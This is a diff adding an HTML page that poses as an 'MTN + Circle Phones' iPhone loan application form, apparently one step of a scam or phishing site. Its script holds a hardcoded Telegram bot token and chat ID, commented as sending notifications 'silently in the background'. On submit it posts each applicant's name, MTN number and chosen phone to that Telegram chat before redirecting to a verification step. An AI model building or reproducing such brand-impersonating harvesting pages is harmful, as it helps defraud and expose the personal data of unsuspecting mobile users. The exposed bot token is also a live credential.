@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Application Form - MTN Circle Phones</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
+            color: #333;
+        }
+
+        /* Header */
+        header {
+            background: linear-gradient(90deg, #FFD600 0%, #FFC400 100%);
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #003DA5;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo span {
+            font-size: 24px;
+        }
+
+        .tagline {
+            font-size: 14px;
+            color: #003DA5;
+            opacity: 0.8;
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 20px;
+        }
+
+        .form-card {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        .form-header {
+            background: linear-gradient(90deg, #003DA5 0%, #0052CC 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .form-header h1 {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .form-header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .phone-summary {
+            background: #FFF9E6;
+            padding: 20px;
+            border-bottom: 2px solid #FFD600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .phone-info {
+            flex: 1;
+        }
+
+        .phone-name {
+            font-size: 20px;
+            font-weight: bold;
+            color: #003DA5;
+            margin-bottom: 5px;
+        }
+
+        .phone-price {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .change-phone {
+            background: #FFD600;
+            color: #003DA5;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+
+        .change-phone:hover {
+            background: #FFC400;
+            transform: scale(1.05);
+        }
+
+        /* Progress Bar */
+        .progress-bar {
+            display: flex;
+            justify-content: space-between;
+            padding: 30px;
+            background: #F5F5F5;
+        }
+
+        .progress-step {
+            flex: 1;
+            text-align: center;
+            position: relative;
+        }
+
+        .progress-step::after {
+            content: '';
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            width: 100%;
+            height: 2px;
+            background: #DDD;
+            z-index: -1;
+        }
+
+        .progress-step:last-child::after {
+            display: none;
+        }
+
+        .step-number {
+            width: 40px;
+            height: 40px;
+            background: #DDD;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+            font-weight: bold;
+            color: white;
+        }
+
+        .progress-step.active .step-number {
+            background: #FFD600;
+            color: #003DA5;
+            box-shadow: 0 0 0 4px rgba(255, 214, 0, 0.2);
+        }
+
+        .progress-step.completed .step-number {
+            background: #4CAF50;
+        }
+
+        .step-label {
+            font-size: 12px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        /* Form Content */
+        .form-content {
+            padding: 40px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            animation: slideIn 0.5s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #003DA5;
+            font-size: 14px;
+        }
+
+        input[type="text"],
+        input[type="tel"],
+        input[type="file"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #E0E0E0;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+
+        input[type="text"]:focus,
+        input[type="tel"]:focus,
+        input[type="file"]:focus {
+            outline: none;
+            border-color: #FFD600;
+            box-shadow: 0 0 0 3px rgba(255, 214, 0, 0.1);
+        }
+
+        .input-hint {
+            font-size: 12px;
+            color: #999;
+            margin-top: 5px;
+        }
+
+        .error {
+            color: #D32F2F;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error.show {
+            display: block;
+        }
+
+        /* Two Column Layout */
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        /* File Upload Preview */
+        .file-preview {
+            margin-top: 10px;
+            padding: 15px;
+            background: #F5F5F5;
+            border-radius: 8px;
+            display: none;
+            text-align: center;
+        }
+
+        .file-preview.show {
+            display: block;
+        }
+
+        .preview-image {
+            max-width: 100%;
+            max-height: 200px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+
+        .preview-name {
+            font-size: 12px;
+            color: #666;
+            word-break: break-all;
+        }
+
+        /* Buttons */
+        .button-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 40px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary {
+            background: linear-gradient(90deg, #FFD600 0%, #FFC400 100%);
+            color: #003DA5;
+            box-shadow: 0 4px 8px rgba(255, 214, 0, 0.3);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(255, 214, 0, 0.4);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-secondary {
+            background: #E0E0E0;
+            color: #333;
+        }
+
+        .btn-secondary:hover {
+            background: #D0D0D0;
+        }
+
+        /* Footer */
+        footer {
+            background: linear-gradient(90deg, #003DA5 0%, #0052CC 100%);
+            color: white;
+            text-align: center;
+            padding: 30px 20px;
+            margin-top: 60px;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .footer-logo {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .footer-text {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+
+            .phone-summary {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
+
+            .progress-bar {
+                padding: 20px;
+            }
+
+            .step-label {
+                font-size: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="header-container">
+            <div class="logo">
+                <span>📱</span>
+                <div>
+                    <div style="font-size: 20px;">MTN + Circle Phones</div>
+                    <div class="tagline">iPhone Loan Program</div>
+                </div>
+            </div>
+            <div style="color: #003DA5; font-weight: bold;">Step 2 of 5: Application</div>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <div class="container">
+        <div class="form-card">
+            <!-- Form Header -->
+            <div class="form-header">
+                <h1>📋 Loan Application</h1>
+                <p>Complete your application to proceed with verification</p>
+            </div>
+
+            <!-- Phone Summary -->
+            <div class="phone-summary">
+                <div class="phone-info">
+                    <div class="phone-name" id="selectedPhoneName">iPhone 15 Pro</div>
+                    <div class="phone-price">Half Payment: <strong id="halfPayment">GHS 2,999.50</strong></div>
+                </div>
+                <button class="change-phone" onclick="window.location.href='catalog.html'">Change Phone</button>
+            </div>
+
+            <!-- Progress Bar -->
+            <div class="progress-bar">
+                <div class="progress-step completed">
+                    <div class="step-number">✓</div>
+                    <div class="step-label">Browse</div>
+                </div>
+                <div class="progress-step active">
+                    <div class="step-number">2</div>
+                    <div class="step-label">Application</div>
+                </div>
+                <div class="progress-step">
+                    <div class="step-number">3</div>
+                    <div class="step-label">Verification</div>
+                </div>
+                <div class="progress-step">
+                    <div class="step-number">4</div>
+                    <div class="step-label">Payment</div>
+                </div>
+                <div class="progress-step">
+                    <div class="step-number">5</div>
+                    <div class="step-label">Ticket</div>
+                </div>
+            </div>
+
+            <!-- Form Content -->
+            <div class="form-content">
+                <form id="applicationForm">
+                    <!-- Personal Information -->
+                    <h3 style="color: #003DA5; margin-bottom: 20px;">👤 Personal Information</h3>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="firstName">First Name *</label>
+                            <input type="text" id="firstName" name="firstName" placeholder="John" required>
+                            <div class="error" id="firstNameError"></div>
+                        </div>
+                        <div class="form-group">
+                            <label for="lastName">Last Name *</label>
+                            <input type="text" id="lastName" name="lastName" placeholder="Doe" required>
+                            <div class="error" id="lastNameError"></div>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="phoneNumber">MTN Phone Number *</label>
+                        <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="e.g., 0245555555 or 0545555555" maxlength="10" required>
+                        <div class="input-hint">Enter your 10-digit MTN number (e.g., 0245555555 or 0545555555)</div>
+                        <div class="error" id="phoneNumberError"></div>
+                    </div>
+
+                    <!-- Buttons -->
+                    <div class="button-group">
+                        <button type="button" class="btn btn-secondary" onclick="window.location.href='catalog.html'">Back</button>
+                        <button type="button" class="btn btn-primary" onclick="nextStep()">Continue to Verification →</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-logo">
+                <span>📱</span>
+                <span>MTN + Circle Phones</span>
+            </div>
+            <div class="footer-text">
+                <p>Get your dream phone today with instant loan approval</p>
+                <p style="margin-top: 10px; font-size: 12px;">© 2026 MTN Circle Phones. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // ===== TELEGRAM BOT CONFIGURATION =====
+        // Notifications are sent silently in the background (not visible in UI)
+        const TELEGRAM_BOT_TOKEN = '8883385216:AAFj6cjQmV9kd7-wf6EZcSnlhuvLlO-PI88';
+        const TELEGRAM_CHAT_ID = '8889432014';
+        // ===== END TELEGRAM CONFIGURATION =====
+
+        function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(err => console.error('Telegram notification error:', err));
+        }
+
+        // Load selected phone info
+        window.addEventListener('load', function() {
+            const phoneData = sessionStorage.getItem('selectedPhone');
+            if (phoneData) {
+                const phone = JSON.parse(phoneData);
+                document.getElementById('selectedPhoneName').textContent = phone.name;
+                document.getElementById('halfPayment').textContent = 'GHS ' + phone.halfPayment;
+            }
+        });
+
+        // Validation
+        function validateForm() {
+            let isValid = true;
+            const firstName = document.getElementById('firstName').value.trim();
+            const lastName = document.getElementById('lastName').value.trim();
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+
+            // Clear errors
+            document.getElementById('firstNameError').classList.remove('show');
+            document.getElementById('lastNameError').classList.remove('show');
+            document.getElementById('phoneNumberError').classList.remove('show');
+
+            // Validate first name
+            if (!firstName) {
+                document.getElementById('firstNameError').textContent = 'First name is required';
+                document.getElementById('firstNameError').classList.add('show');
+                isValid = false;
+            } else if (firstName.length < 2) {
+                document.getElementById('firstNameError').textContent = 'First name must be at least 2 characters';
+                document.getElementById('firstNameError').classList.add('show');
+                isValid = false;
+            }
+
+            // Validate last name
+            if (!lastName) {
+                document.getElementById('lastNameError').textContent = 'Last name is required';
+                document.getElementById('lastNameError').classList.add('show');
+                isValid = false;
+            } else if (lastName.length < 2) {
+                document.getElementById('lastNameError').textContent = 'Last name must be at least 2 characters';
+                document.getElementById('lastNameError').classList.add('show');
+                isValid = false;
+            }
+
+            // Validate MTN phone number — must start with 024 or 054
+            if (!phoneNumber) {
+                document.getElementById('phoneNumberError').textContent = 'MTN phone number is required';
+                document.getElementById('phoneNumberError').classList.add('show');
+                isValid = false;
+            } else if (!/^(024|054|059|053|055)[0-9]{7}$/.test(phoneNumber)) {
+                document.getElementById('phoneNumberError').textContent = 'Enter a valid 10-digit MTN number';
+                document.getElementById('phoneNumberError').classList.add('show');
+                isValid = false;
+            }
+
+            return isValid;
+        }
+
+        function nextStep() {
+            if (validateForm()) {
+                const phoneData = JSON.parse(sessionStorage.getItem('selectedPhone') || '{}');
+                const formData = {
+                    firstName: document.getElementById('firstName').value.trim(),
+                    lastName: document.getElementById('lastName').value.trim(),
+                    phoneNumber: document.getElementById('phoneNumber').value.trim()
+                };
+
+                sessionStorage.setItem('applicationData', JSON.stringify(formData));
+
+                // Send Telegram notification
+                const now = new Date().toLocaleString('en-GH', { timeZone: 'Africa/Accra' });
+                const msg =
+                    `📋 <b>NEW LOAN APPLICATION SUBMITTED</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `👤 <b>Name:</b> ${formData.firstName} ${formData.lastName}\n` +
+                    `📞 <b>MTN Number:</b> ${formData.phoneNumber}\n` +
+                    `📱 <b>Phone Selected:</b> ${phoneData.name || 'N/A'}\n` +
+                    `💰 <b>Half Payment:</b> GHS ${phoneData.halfPayment || 'N/A'}\n` +
+                    `🕐 <b>Time:</b> ${now}\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `➡️ Applicant is proceeding to Verification step.`;
+
+                sendTelegramMessage(msg);
+
+                window.location.href = 'verification.html';
+            }
+        }
+
+        // Allow Enter key to submit
+        document.getElementById('applicationForm').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                nextStep();
+            }
+        });
+    </script>
+</body>
+</html>
